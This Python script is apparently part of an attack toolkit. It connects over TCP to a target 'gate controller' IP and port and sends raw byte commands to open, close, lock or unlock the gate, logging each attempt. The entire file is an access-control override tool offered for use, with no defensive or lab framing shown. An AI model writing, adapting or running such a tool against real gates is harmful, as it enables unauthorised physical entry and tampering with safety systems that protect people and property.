#!/usr/bin/env python3
# modules/attacks/gate_control_override.py

import argparse
import socket
import os
import time

LOG = "results/gate_override.log"
COMMANDS = {
    "open": b'\xAA\x01\x01\xBB',
    "close": b'\xAA\x01\x00\xBB',
    "lock": b'\xAA\x02\x01\xBB',
    "unlock": b'\xAA\x02\x00\xBB'
}

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")

def override_gate(ip, port, cmd):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(COMMANDS[cmd])
        log(f"Sent command '{cmd}' to {ip}:{port}")
        s.close()
    except Exception as e:
        log(f"[ERROR] {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Remote Gate Controller Override")
    parser.add_argument("--ip", required=True, help="Target gate IP")
    parser.add_argument("--port", type=int, default=9000, help="Target gate port")
    parser.add_argument("--cmd", required=True, choices=COMMANDS.keys(), help="Command to send")
    args = parser.parse_args()
    override_gate(args.ip, args.port, args.cmd)
